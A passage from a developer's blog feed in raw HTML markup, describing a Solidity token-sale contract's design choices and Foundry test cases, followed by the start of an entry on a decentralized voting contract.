&lt;p&gt;&lt;strong&gt;Inheritance from OpenZeppelin Contracts:&lt;&#x2F;strong&gt; The contract uses OpenZeppelin&#x27;s &lt;code&gt;Ownable&lt;&#x2F;code&gt; and &lt;code&gt;SafeERC20&lt;&#x2F;code&gt; contracts, which are well-tested and widely accepted in the Ethereum community for managing ownership and safe token transfers, respectively.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Access Control:&lt;&#x2F;code&gt; The &lt;code&gt;onlyOwner&lt;&#x2F;code&gt; modifier from the &lt;code&gt;Ownable&lt;&#x2F;code&gt; contract is used throughout the TokenSale contract to restrict certain sensitive functions to be executed only by the contract owner.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Use of SafeERC20:&lt;&#x2F;strong&gt; The contract uses the &lt;code&gt;SafeERC20&lt;&#x2F;code&gt; library for safe token interactions, which helps prevent issues related to token transfers, such as &lt;code&gt;reentrancy&lt;&#x2F;code&gt; and token transfer edge cases.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Custom Errors:&lt;&#x2F;strong&gt; The contract defines custom errors for various failure conditions, making it easier to understand why transactions fail and saving gas compared to traditional &lt;code&gt;require&lt;&#x2F;code&gt; statements with error messages.
&lt;code&gt;solidity     error TokenSale_Invalid_Max_Min();     error TokenSale_Invalid_Sale_Duration();     error TokenSale_Invalid_Token();     error TokenSale_Presale_Already_Active();     error TokenSale_Presale_Not_Started();     error TokenSale_Contribution_Limit_Passed();     error TokenSale_Not_Enough_Contribution();     error TokenSale_Presale_Max_Cap_Passed();     error TokenSale_Insufficient_Token_Balance();     error TokenSale_Publicsale_Not_Started();     error TokenSale_Publicsale_Max_Cap_Passed();     error TokenSale_Publicsale_Already_Active();     error TokenSale_Invalid_To_Address();     error TokenSale_Sale_Min_Cap_Reached();     error TokenSale_InsufficientBalance(address);     error TokenSale_Refund_Tx_Failed();     error TokenSale_Not_Contributed();     error TokenSale_Owner_Cant_Buy();     &lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Input Validation:&lt;&#x2F;strong&gt; The contract includes input validation using modifiers such as &lt;code&gt;isValidCapacities&lt;&#x2F;code&gt; and &lt;code&gt;isValidDuration&lt;&#x2F;code&gt; to ensure that the parameters for presale and public sale are within logical and acceptable ranges.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;State Checks:&lt;&#x2F;strong&gt; Functions like &lt;code&gt;buyTokensInPresale&lt;&#x2F;code&gt; and &lt;code&gt;buyTokensInPublicsale&lt;&#x2F;code&gt; check the state of the sale using conditions to ensure that tokens can only be bought when the sales are active and not otherwise.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Contribution Tracking:&lt;&#x2F;strong&gt; The contract tracks contributions in mappings, allowing for individual refund logic and ensuring that contributions can be returned if certain conditions (like not reaching the minimum cap) are met.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Refund Logic:&lt;&#x2F;strong&gt; The contract provides a claimRefund function that allows users to claim refunds after the presale or public sale ends if the minimum cap is not reached, with checks to prevent refunds while the sale is active.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Emergency Withdrawal:&lt;&#x2F;strong&gt; The &lt;code&gt;withdraw&lt;&#x2F;code&gt; function allows the contract owner to withdraw all funds and tokens from the contract in case of emergency, using the &lt;code&gt;onlyOwner&lt;&#x2F;code&gt; modifier for access control.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Visibility and State Mutability Restrictions:&lt;&#x2F;strong&gt; The contract uses appropriate visibility (public, internal, etc.) and state mutability (view, payable, etc.) specifiers to restrict access and modifications to functions and state variables.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Event Emission:&lt;&#x2F;strong&gt; The contract emits events for significant actions like starting sales, token purchases, and refunds, which helps in tracking contract activity and debugging.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;```solidity
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_PreSale_Contribution_Limits_Changed(uint indexed min, uint indexed max);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_PublicSale_Contribution_Limits_Changed(uint indexed min, uint indexed max);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_Thanks_For_Donation(address indexed sender);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_Pre_Sale_Started(uint);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_Public_Sale_Started(uint);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_Tokens_Sent_In_Presale(address indexed receiver, uint indexed amount);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_Tokens_Sent_In_Publicsale(address indexed receiver, uint indexed amount);
&lt;&#x2F;span&gt;&lt;span&gt;event Token_Presale_Refund_Success(address indexed receiver, uint);
&lt;&#x2F;span&gt;&lt;span&gt;event Token_Publicsale_Refund_Success(address indexed receiver, uint);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_Emergency_Withdraw(address indexed owner);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_PublicSale_Cap_Set(uint min, uint max);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSale_PreSale_Cap_Set(uint min, uint max);
&lt;&#x2F;span&gt;&lt;span&gt;```
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;Time-Based Logic:&lt;&#x2F;strong&gt; The contract uses block timestamps to manage the durations of the presale and public sale, ensuring that they only last for the intended period.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Receive Function:&lt;&#x2F;strong&gt; A &lt;code&gt;receive&lt;&#x2F;code&gt; function is included to handle plain unexpected Ether transfers to the contract.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;test-cases&quot;&gt;Test Cases&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;setUp:&lt;&#x2F;strong&gt; Initializes the testing environment by deploying the EliteToken and TokenSale contracts and transferring some tokens to the TokenSale contract.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testTokenBalance:&lt;&#x2F;strong&gt; Confirms that the TokenSale contract received the correct number of tokens and that the remaining balance is with the test contract (the owner).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testInitialization:&lt;&#x2F;strong&gt; Validates that the TokenSale contract&#x27;s owner is set correctly.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testSetPresaleCapacity:&lt;&#x2F;strong&gt; Checks that the presale capacity (minimum and maximum caps) can be set correctly.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testSetPresaleCapacityNotOwner:&lt;&#x2F;strong&gt; Ensures that only the owner can set the presale capacity by expecting a revert when a non-owner account attempts to set it.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testSetPresaleCapacityInvalidParams:&lt;&#x2F;strong&gt; Tests various invalid parameters for setting the presale capacity to confirm that the contract correctly reverts these transactions.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testSetPublicsaleCapacity:&lt;&#x2F;strong&gt; Similar to testSetPresaleCapacity, but for the public sale capacity.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testSetPublicsaleCapacityNotOwner:&lt;&#x2F;strong&gt; Similar to testSetPresaleCapacityNotOwner, but for the public sale capacity.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testSetPublicsaleCapacityInvalidParams:&lt;&#x2F;strong&gt; Similar to testSetPresaleCapacityInvalidParams, but for the public sale capacity.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testSetPresaleDuration:&lt;&#x2F;strong&gt; Checks that the presale duration can be set correctly.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testSetPresaleDurationNotOwner:&lt;&#x2F;strong&gt; Ensures that only the owner can set the presale duration.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testSetPresaleDurationInvalidDuration:&lt;&#x2F;strong&gt; Tests that setting an invalid presale duration results in a revert.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPresaleInvalidContribution:&lt;&#x2F;strong&gt; This test checks that the startPreSale function reverts when called with invalid contribution limits. It validates that contributions cannot be zero, and the minimum contribution cannot be higher than the maximum contribution.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPresaleAgain:&lt;&#x2F;strong&gt; This test ensures that attempting to start a new presale while one is already active should fail. It tests that the contract prevents overlapping presales.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPresaleAgainAfterEnd:&lt;&#x2F;strong&gt; This test checks that a new presale can be started after the previous one has ended. It uses vm.warp to simulate time passing and ensures that starting a new presale is allowed only after the previous one has concluded.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPublicsale:&lt;&#x2F;strong&gt; This test verifies that the public sale can start correctly after the presale has ended. It simulates the end of the presale by advancing the block timestamp and then starts the public sale.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPublicsaleNotOwner:&lt;&#x2F;strong&gt; This test confirms that only the owner can start the public sale. It uses vm.prank to simulate a non-owner account attempting to start the sale, expecting the transaction to revert.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPublicsalePresaleRunning:&lt;&#x2F;strong&gt; This test ensures that the public sale cannot start if the presale is still active, expecting the relevant error to be thrown if this rule is violated.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPublicsalePresaleNotStarted:&lt;&#x2F;strong&gt; This test checks that the public sale cannot start if the presale has not been initialized, expecting a revert with the appropriate error.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPublicsaleAgain:&lt;&#x2F;strong&gt; This test verifies that once the public sale has started, attempting to start it again should fail to prevent duplicate sales.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPublicsaleAgainAfterEnd:&lt;&#x2F;strong&gt; This test checks that a new public sale can start after the previous one has ended, similar to the presale tests.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPublicsaleInvalidCap:&lt;&#x2F;strong&gt; This test is similar to testStartPresaleInvalidContribution, but for the public sale. It checks for reverts when invalid presale caps are provided.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPublicsaleInvalidDuration:&lt;&#x2F;strong&gt; This test checks that the public sale cannot be started with a duration of zero, expecting a revert with the appropriate error.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testStartPublicsaleInvalidContribution:&lt;&#x2F;strong&gt; This test is similar to testStartPresaleInvalidContribution, but it checks the public sale&#x27;s contribution limits for validity.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPresale:&lt;&#x2F;strong&gt; This test verifies that tokens can be purchased in the presale. It uses hoax to simulate an account with Ether and checks the token and Ether balances after the purchase.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPresaleMaxContribute:&lt;&#x2F;strong&gt; This test checks that an account cannot exceed the maximum contribution limit during the presale by making multiple purchases.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPresaleAfterSomeTime:&lt;&#x2F;strong&gt; This test ensures that contributions can still be made after some time has passed in the presale, using &lt;code&gt;vm.warp&lt;&#x2F;code&gt; to simulate the passage of time.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPresaleContributeLimits:&lt;&#x2F;strong&gt; This test checks that the presale contribution limits are enforced, expecting reverts if the contribution is too high or too low.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPresaleNotStarted:&lt;&#x2F;strong&gt; This test ensures that attempting to buy tokens before the presale has started should fail.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPresaleOver:&lt;&#x2F;strong&gt; This test confirms that once the presale is over, no more tokens can be purchased, simulating the end of the presale with &lt;code&gt;vm.warp&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPresaleCapLimits:&lt;&#x2F;strong&gt; This test verifies that the presale respects the maximum cap set for the sale. It simulates three different buyers trying to purchase tokens during the presale, with the third purchase exceeding the presale cap and expecting a revert.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPresaleInsufficientBal&lt;&#x2F;strong&gt;: This test checks that the TokenSale contract cannot sell more tokens than it holds. It sets up a scenario where the contract has only a small number of tokens and attempts to sell more than that amount, expecting the transaction to revert due to insufficient token balance.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPresaleWhileAndAfterPublicSale:&lt;&#x2F;strong&gt; This test ensures that once the public sale has started, and after it has ended, no purchases can be made through the presale function. It does this by starting the presale, then the public sale, and then trying to make a presale purchase, which should fail.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPublicsale&lt;&#x2F;strong&gt;: This function tests the basic functionality of buying tokens during the public sale. It starts with the presale, advances time to allow the public sale to start, and then simulates a purchase of tokens during the public sale.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPublicsaleMaxContribute:&lt;&#x2F;strong&gt; Similar to the presale test, this test checks that an individual cannot exceed the maximum contribution limit during the public sale, even with multiple purchases.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPublicsaleContributeLimits:&lt;&#x2F;strong&gt; This test ensures that the public sale enforces both minimum and maximum contribution limits, expecting transactions that fall outside these limits to revert.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPublicsaleNotStarted:&lt;&#x2F;strong&gt; This test ensures that the public sale function cannot be used before the public sale has officially started, expecting the transaction to revert if attempted.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPublicsaleOver:&lt;&#x2F;strong&gt; This test verifies that no purchases can be made through the public sale function once the public sale has ended.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPublicsaleCapLimits:&lt;&#x2F;strong&gt; This test is similar to testBuyTokensInPresaleCapLimits, but for the public sale. It ensures that the public sale respects its maximum cap and that attempts to buy beyond this cap will fail.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPublicsaleInsufficientBal:&lt;&#x2F;strong&gt; This test, akin to testBuyTokensInPresaleInsufficientBal, checks that the TokenSale contract cannot sell more tokens than it possesses during the public sale.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testBuyTokensInPrePublicsales:&lt;&#x2F;strong&gt; This test checks the scenario where an investor buys tokens during the presale and then again during the public sale, verifying the token balances after each purchase and ensuring that no purchases can be made once the public sale is over.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testsendTokensTo:&lt;&#x2F;strong&gt; This function tests the sendTokensTo functionality of the contract, which is likely a way to distribute tokens to a specific address. It ensures that only authorized accounts (presumably the contract owner) can call this function.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testReceive:&lt;&#x2F;strong&gt; This test seems to check the behavior of the contract when it receives a plain Ether transfer, which might trigger a fallback function designed to handle such transactions. It expects a specific event to be emitted, acknowledging the receipt of the donation.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testIsPresaleActive:&lt;&#x2F;strong&gt; This test checks the isPresaleActive function of the TokenSale contract. It starts the presale and asserts that isPresaleActive returns true. Then it warps the blockchain time by one day and checks that isPresaleActive returns false, indicating the presale has ended.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testIsPublicsaleActive:&lt;&#x2F;strong&gt; This test verifies the isPublicsaleActive function. It starts the presale, then warps time by one day to start the public sale. It checks that isPresaleActive returns false and isPublicsaleActive returns true. After warping time by an additional two days, it asserts that isPublicsaleActive returns false, indicating the public sale has ended.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testIsPublicsaleHappened:&lt;&#x2F;strong&gt; This test checks if the isPresaleHappened function correctly tracks whether the presale has occurred. Initially, it asserts the function returns false. After starting the presale and warping time by three days, it asserts the function returns true.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testClaimRefundPresale:&lt;&#x2F;strong&gt; This test ensures that participants can claim refunds after the presale ends. It starts the presale, has an account buy tokens, then warps time by one day and calls claimRefund. It checks that the account&#x27;s balance is refunded.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testClaimRefundPresaleNotEnd:&lt;&#x2F;strong&gt; This test confirms that trying to claim a refund while the presale is still active should fail and cause a revert with the appropriate error.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testClaimRefundPublicsale:&lt;&#x2F;strong&gt; Similar to the presale refund test, this checks that participants can claim refunds after the public sale ends. It starts the presale, starts the public sale after one day, has an account buy tokens, warps time by two days, and then calls claimRefund, checking for a refund.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testClaimRefundPrePublicsalesNotEnd:&lt;&#x2F;strong&gt; This test verifies that attempting to claim a refund from the public sale while it&#x27;s still active should fail, resulting in a revert with the appropriate error.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testClaimRefundPrePublicsalesMinCapReached:&lt;&#x2F;strong&gt; This test ensures that if the minimum cap of the sale is reached, participants cannot claim refunds, expecting a revert with the appropriate error.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;testWithdraw:&lt;&#x2F;strong&gt; This test checks the withdraw function of the TokenSale contract. It expects an event to be emitted indicating an emergency withdrawal and confirms that only authorized accounts can call this function, expecting a revert for unauthorized accounts.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;**testDeployScript:**This test ensures that the deployment script works correctly. It deploys the contracts using the DeployScript and checks that the token and sale contract addresses are non-zero and that the sale contract has the correct token balance.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;And 10 more tests....&lt;&#x2F;p&gt;
&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge build
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;test&quot;&gt;Test&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge test
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;gas-snapshots&quot;&gt;Gas Snapshots&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge snapshot
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;deploy&quot;&gt;Deploy&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge script script&#x2F;DeployScript.s.sol:DeployScript --rpc-url &amp;lt;your_rpc_url&amp;gt; --private-key &amp;lt;your_private_key&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Decentralized Voting System</title>
        <published>2024-01-23T00:00:00+00:00</published>
        <updated>2024-01-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/projects/votingproject/"/>
        <id>https://themj0ln1r.github.io/projects/votingproject/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/projects/votingproject/">&lt;p&gt;A simple Decentralized Project developed by me for an internship task.&lt;&#x2F;p&gt;
&lt;p&gt;Project Repo :  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;Decentralized-Voting-System&quot; target=_blank&gt;Decentralized Voting Project&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;decentralized-voting-system&quot;&gt;&lt;strong&gt;Decentralized Voting System&lt;&#x2F;strong&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;The system has following features:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Users can register to vote.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The owner of the contract can add candidates.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Only owner can start an election.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Multiple Elections can be conducted.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Registered voters can cast their votes for a specific candidate.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The voting process should be transparent, and the results should be publicly accessible.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;design-choices&quot;&gt;Design Choices&lt;&#x2F;h2&gt;
&lt;p&gt;The Election contract is designed to manage a simple voting process, with features to register voters and candidates, cast votes, and reveal election results.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Access Control:&lt;&#x2F;strong&gt; The contract uses an onlyOwner modifier to restrict certain functions (like registering candidates and revealing results) to the owner of the contract, which is set during contract deployment.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Voter Tracking:&lt;&#x2F;strong&gt; Voters are tracked using mappings that associate their addresses with respective Voter. This design allows for efficient lookups and updates.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Unique Identifiers:&lt;&#x2F;strong&gt; Both voters and candidates are assigned unique IDs to differentiate them within their respective categories.
Vote Casting Mechanism: Voters can cast votes for registered candidates, and the contract ensures that each voter can only vote once.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Election Results:&lt;&#x2F;strong&gt; The contract allows the owner to calculate and reveal the winner based on the number of votes each candidate received. The reveal results feature is a bit complex as it supports if the multiple candidates got the same majority.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Election Duration:&lt;&#x2F;strong&gt; The contract checks whether the election is active before allowing certain operations (e.g., voter registration, voting). This prevents these operations from occurring outside the specified election duration.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Events:&lt;&#x2F;strong&gt; The contract emits events for candidate registration, voter registration, vote casting, and winner declaration, which helps in tracking activities on the blockchain.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Error Handling:&lt;&#x2F;strong&gt; The contract uses error messages to clearly communicate the reasons for transaction failures. For example, it raises errors like Election_Not_Owner(), Election_Voter_Already_Registered(), etc. This helps users and developers understand the context of the failure.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Time-Based Logic:&lt;&#x2F;strong&gt; The contract uses &lt;code&gt;electionDuration&lt;&#x2F;code&gt; and &lt;code&gt;electionStartTime&lt;&#x2F;code&gt; to manage the duration of the election.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Dynamic Arrays&lt;&#x2F;strong&gt;: The &lt;code&gt;candidateDetails&lt;&#x2F;code&gt; array is used to store a dynamic list of &lt;code&gt;Candidate&lt;&#x2F;code&gt; structs. This allows for an arbitrary number of candidates to be registered in the election.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;State Variables:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;owner&lt;&#x2F;code&gt;: The address of the contract owner.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;totalNumOfVoters&lt;&#x2F;code&gt;: A counter for the total number of registered voters.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;totalNumOfCandidates&lt;&#x2F;code&gt;: A counter for the total number of registered candidates.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;voterDetails&lt;&#x2F;code&gt;: A mapping from voter addresses to Voter structs.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;candidateDetails&lt;&#x2F;code&gt;: A mapping from candidate addresses to Candidate&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Structs&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;candidIdToAddr&lt;&#x2F;code&gt;: A mapping from candidate IDs to their addresses.
Structs:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Voter&lt;&#x2F;code&gt;: Contains voter ID and a boolean indicating whether the voter has voted.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Candidate&lt;&#x2F;code&gt;: Contains candidate ID and the number of votes received.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Modifiers&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;onlyOwner&lt;&#x2F;code&gt;: Restricts function access to the contract owner.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Functions&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;registerVoter&lt;&#x2F;code&gt;(): Allows an address to register as a voter.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;registerCandidate(address _candidate)&lt;&#x2F;code&gt;: Allows the owner to register a new candidate.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;castVote(address _candidate)&lt;&#x2F;code&gt;: Allows a registered voter to cast a vote for a registered candidate.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;revealResults()&lt;&#x2F;code&gt;: Allows the owner to calculate and reveal the winner of the election.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;getMajority(address _candidate)&lt;&#x2F;code&gt;: Returns the number of votes for a given candidate.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Events&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
